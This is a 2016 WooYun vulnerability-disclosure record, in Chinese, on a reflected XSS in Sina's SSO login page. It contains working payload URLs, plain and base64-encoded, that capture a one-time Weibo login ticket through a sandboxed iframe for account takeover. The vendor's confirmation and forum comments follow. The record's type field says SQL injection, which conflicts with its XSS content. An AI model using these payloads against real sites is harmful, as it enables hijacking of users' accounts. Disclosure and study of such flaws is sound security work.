{"id": 86241, "wybug_id": "wooyun-2016-0189664", "wybug_title": "新浪微博之点击我的链接就登录你的微博（XSS敏感域）", "wybug_corp": "新浪微博", "wybug_author": "loopx9", "wybug_date": "2016-03-27 18:34", "wybug_open_date": "2016-05-12 12:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向公众公开  简要描述： 反射xss一枚. 详细说明：  一处反射型xss，用户名为base64编码， 没有过滤.\nhttp://login.sina.com.cn/sso/login.php?su=ZnNkZnNkZicvPg0KPHNjcmlwdD4NCmFsZXJ0KC94c3MvKTsNCjwvc2NyaXB0Pjwn&sp=&encoding=UTF-8&returntype=META\n\n\n因为是login.sina.com.cn下的xss，可以进一步利用。微博单点登录获取ticket url:\nhttp://login.sina.com.cn/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&gateway=1&service=miniblog&entry=miniblog&useticket=1&returntype=META&_client_version=0.6.14\n\n\n\nhttp://passport.weibo.com/wbsso/login?url=http%3A%2F%2Fweibo.com%2F&ticket=ST-*****-1459053552-xd-5025***98696******922F1*30E&retcode=0\n经测试ticket是一次性的，没有绑定浏览器UA、客户端IP，所以只要获取到这条url，就能登录对应的微博账户了。payload构造如下:\nredirect=null;document.body.innerHTML=\"<iframe id=\\\"xxoo\\\" sandbox=\\\"allow-same-origin\\\" src=\\\"http://login.sina.com.cn/sso/login.php?url=http://weibo.com/&gateway=1&service=miniblog&entry=miniblog&useticket=1&returntype=META&_client_version=0.6.14\\\" onload=\\\"alert(document.getElementById('xxoo').contentWindow.document.body.innerHTML)\\\" width=\\\"0\\\" height=\\\"0\\\"/>\";\nredirect=null;重写redirect函数防止页面跳转。挂一个iframe，利用html5中iframe的sandbox属性，不执行iframe里边的js代码，而后onload事件获取iframe窗体内容，从而得到未使用的ticket。构造好的url如下:\nhttp://login.sina.com.cn/sso/login.php?su=ZnNkZnNkZicvPg0KPHNjcmlwdD4NCnJlZGlyZWN0PW51bGw7DQpkb2N1bWVudC5ib2R5LmlubmVySFRNTD0iPGlmcmFtZSBpZD1cInh4b29cIiBzYW5kYm94PVwiYWxsb3ctc2FtZS1vcmlnaW5cIiBzcmM9XCJodHRwOi8vbG9naW4uc2luYS5jb20uY24vc3NvL2xvZ2luLnBocD91cmw9aHR0cCUzQSUyRiUyRndlaWJvLmNvbSUyRiZnYXRld2F5PTEmc2VydmljZT1taW5pYmxvZyZlbnRyeT1taW5pYmxvZyZ1c2V0aWNrZXQ9MSZyZXR1cm50eXBlPU1FVEEmX2NsaWVudF92ZXJzaW9uPTAuNi4xNFwiIG9ubG9hZD1cImFsZXJ0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd4eG9vJykuY29udGVudFdpbmRvdy5kb2N1bWVudC5ib2R5LmlubmVySFRNTClcIiB3aWR0aD1cIjBcIiBoZWlnaHQ9XCIwXCIvPiI7DQo8L3NjcmlwdD48Jw==&sp=&encoding=UTF-8&returntype=META\n   漏洞证明：  本地测试弹窗:\n\n将窗体内容发送至cloudeye:\n\n\n\n期间叫一个白帽子测试了一下，使用cloudeye记录的url成功登录他的微博。\n\n   修复方案：  .   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-03-28 12:39 厂商回复： 感谢关注新浪安全，问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-27 18:35 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:307 漏洞数:70        | baozisec)\t\t \n  被盗号了    \n     2016-03-27 18:56 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:573 漏洞数:74        | http://weibo.com/fds1986)\t\t \n  hacked by loopx9    \n     2016-03-27 18:58 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:810 漏洞数:127        | ®高级安全工程师 | WooYun认证√)\t\t \n  还好我几年没上过微博了    \n     2016-03-27 19:28 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1360 漏洞数:150        | 乌云核心菜鸟，联盟托管此号中，欢迎加入08...)\t\t \n  支持loopx9大牛，来看看这个XSS是怎么牛逼利用的    \n     2016-03-27 19:37 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  Mark    \n     2016-03-27 19:38 |    \t\t田老板 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:9        | 学校杀手)\t\t \n  前排    \n     2016-03-27 19:46 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  前排。    \n     2016-03-27 19:47 |    \t\t孤梦° \t\t\t( 普通白帽子  |\t\t\t        Rank:143 漏洞数:48        )\t\t \n  支持loopx9大牛，来看看这个XSS是怎么牛逼利用的    \n     2016-03-27 19:48 |    \t\t镱鍚 \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:32        | 。。！)\t\t \n  说干就是干啊    \n     2016-03-27 20:09 |    \t\ttangtanglove \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:7        | 一个对安全感兴趣的屌丝phper)\t\t \n  反射的现在不是都不给审核吗？    \n     2016-03-27 20:59 |    \t\t龚稳 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:18        | 没有做不到的，只有不想做的)\t\t \n  大牛  我微博密码不知道了  帮帮忙呗    \n     2016-04-17 12:56 |    \t\t玉林嘎  \t\t\t( 普通白帽子  |\t\t\t        Rank:941 漏洞数:108        )\t\t \n  Tomato菜的要死    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}